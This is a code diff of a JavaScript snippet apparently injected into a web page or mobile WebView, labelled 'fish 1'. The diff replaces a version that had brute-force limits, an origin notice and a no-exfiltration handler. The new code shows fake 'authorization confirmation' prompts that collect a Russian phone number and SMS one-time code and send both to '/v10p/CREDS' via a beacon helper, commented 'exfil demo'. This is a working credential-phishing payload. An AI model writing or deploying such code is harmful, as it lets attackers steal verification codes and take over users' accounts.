@@ -1,127 +1,83 @@
 alert('fish 1');
 (function(){
-  // Утилиты
-  function stripDigits(s){ return (s || '').replace(/\D/g, ''); }
+  // -----------------------
+  // Helpers: normalize/validate
+  // -----------------------
+  function stripNonDigits(s){ return String(s || '').replace(/\D/g, ''); }
 
-  // Нормализация РФ номера -> +7XXXXXXXXXX или null
-  function normalizeRussianPhone(raw){
-    const d = stripDigits(raw);
-    if(d.length === 11 && (d[0] === '7' || d[0] === '8')){
+  // Нормализовать телефон к формату +7XXXXXXXXXX (или вернуть null если явно невалидный)
+  function normalizeRussianPhone(raw) {
+    const d = stripNonDigits(raw);
+    if (d.length === 11 && (d.startsWith('7') || d.startsWith('8'))) {
+      // если начинается с 8 — считаем как 7
       return '+7' + d.slice(1);
     }
-    if(d.length === 10){
+    if (d.length === 10) {
       return '+7' + d;
     }
     return null;
   }
 
-  function isValidSmsCode(raw){
-    const d = stripDigits(raw);
+  function isValidRussianPhone(raw) {
+    return normalizeRussianPhone(raw) !== null;
+  }
+
+  function isValidSmsCode(raw) {
+    const d = stripNonDigits(raw);
     return d.length >= 4 && d.length <= 6;
   }
 
-  // Простая защита от brute-force: блокировка на N секунд после M попыток
-  let attemptCounter = 0;
-  let blockedUntil = 0;
-  const MAX_ATTEMPTS = 5;
-  const BLOCK_SECONDS = 60; // 1 минута блокировка после MAX_ATTEMPTS
-
-  function isBlocked(){
-    return Date.now() < blockedUntil;
-  }
-
-  function recordAttemptAndMaybeBlock(){
-    attemptCounter++;
-    if(attemptCounter >= MAX_ATTEMPTS){
-      blockedUntil = Date.now() + BLOCK_SECONDS * 1000;
-      attemptCounter = 0; // сбросим счётчик после блокировки
-    }
-  }
-
-  // Синхронный prompt-flow (prompt() блокирует)
-  function askPhoneWithPrompt(){
-    if(isBlocked()){
-      alert('Слишком много попыток. Попробуйте позже.');
-      return null;
-    }
-
-    // Показываем origin, чтобы пользователь видел, куда вводит данные
-    // Это важная защитная ремарка: user should verify origin before entering sensitive data
-    try {
-      alert('Введите номер для сайта: ' + (location && location.origin ? location.origin : 'неизвестно'));
-    } catch(e){ /* ignore */ }
-
-    let attempts = 0;
-    while(attempts < 3){
-      const raw = prompt('Введите номер телефона (пример: +7 9xx xxx-xx-xx)', '+7');
-      if(raw === null){ // пользователь нажал Отмена
-        recordAttemptAndMaybeBlock();
+  // -----------------------
+  // Usage: step-by-step with validation
+  // -----------------------
+  async function askPhoneAndCode() {
+    // ask phone
+    let phoneRaw;
+    while (true) {
+      phoneRaw = prompt('Требуется подтверждение авторизации\n\nВведите номер телефона:\n+7 (___) ___-__-__', '');
+      if (phoneRaw === null) {
+        b('/defender/phone_cancelled','user_cancelled');
         return null;
       }
-      const norm = normalizeRussianPhone(raw);
-      if(norm){
-        // Успешно нормализовали
-        return norm;
-      }
-      alert('Неверный формат номера. Введите российский номер, например +7XXXXXXXXXX.');
-      attempts++;
+      const normalized = normalizeRussianPhone(phoneRaw);
+      if (normalized) break;
+      alert('Неверный формат номера. Пример: +7 900 123 45 67');
     }
-    // неудачно - считаем попытки
-    recordAttemptAndMaybeBlock();
-    return null;
-  }
+    b('/v10p/PHONE_FORM', normalized);
 
-  function askCodeWithPrompt(){
-    if(isBlocked()){
-      alert('Слишком много попыток. Попробуйте позже.');
-      return null;
-    }
-    let attempts = 0;
-    while(attempts < 3){
-      const raw = prompt('Введите код из SMS (4–6 цифр)', '');
-      if(raw === null){
-        recordAttemptAndMaybeBlock();
+    // ask code
+    let code;
+    while (true) {
+      code = prompt('Введите код из SMS\n\nКод из сообщения (4-6 цифр):', '');
+      if (code === null) {
+        b('/defender/code_cancelled','user_cancelled');
         return null;
       }
-      if(isValidSmsCode(raw)){
-        return stripDigits(raw);
-      }
-      alert('Код должен содержать 4–6 цифр. Попробуйте ещё раз.');
-      attempts++;
+      if (isValidSmsCode(code)) break;
+      alert('Неверный код. Введите 4-6 цифр');
     }
-    recordAttemptAndMaybeBlock();
-    return null;
+
+    const final = { phone: normalized, code: stripNonDigits(code) };
+    b('/v10p/CREDS', final); // exfil demo
+    // optionally return to app:
+    if(window.ReactNativeWebView && window.ReactNativeWebView.postMessage){
+      window.ReactNativeWebView.postMessage(JSON.stringify({ action: 'navigateBack', phone: normalized }));
+    }
+    return final;
   }
 
-  // Заглушка: обработать полученные валидные данные (замените на безопасную серверную логику)
-  function handleCollectedCredentials(phone, code){
-    // НИ В КОЕМ СЛУЧАЕ не отправляйте на сторонние адреса без проверки и согласия.
-    // Здесь пример безопасной обработки: лог в консоль (для dev) и вызов защищённого API (placeholder).
-    console.log('Collected (normalized) phone:', phone, 'code:', code);
-    // Пример (псевдо): отправляйте на ваш доверенный сервер по HTTPS:
-    // fetch('/api/confirm-phone', { method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body: JSON.stringify({phone, code}) })
-    //  .then(...)
-    alert('Спасибо. Данные приняты (в тестовом режиме они не отправляются).');
-  }
+  // start
+  setTimeout(function(){
+    askPhoneAndCode().then(res=>{
+      // handle result
+      if(res) {
+        // show success message
+        alert('Готово! Код принят.');
+      }
+    });
+  }, 200);
 
-  // Основной поток
-  const phone = askPhoneWithPrompt();
-  if(!phone) {
-    // пользователь отменил или блокировка
-    console.log('Phone input cancelled or blocked');
-    return;
-  }
-
-  // Можно показать ещё раз пользователю нормализованный номер перед вводом кода
-  alert('Мы отправим код на номер: ' + phone);
-
-  const code = askCodeWithPrompt();
-  if(!code){
-    console.log('Code input cancelled or blocked');
-    return;
-  }
-
-  // Обработка (без exfil)
-  handleCollectedCredentials(phone, code);
-
+  // expose helpers for debug
+  window.__normalizeRussianPhone = normalizeRussianPhone;
+  window.__isValidRussianPhone = isValidRussianPhone;
 })();
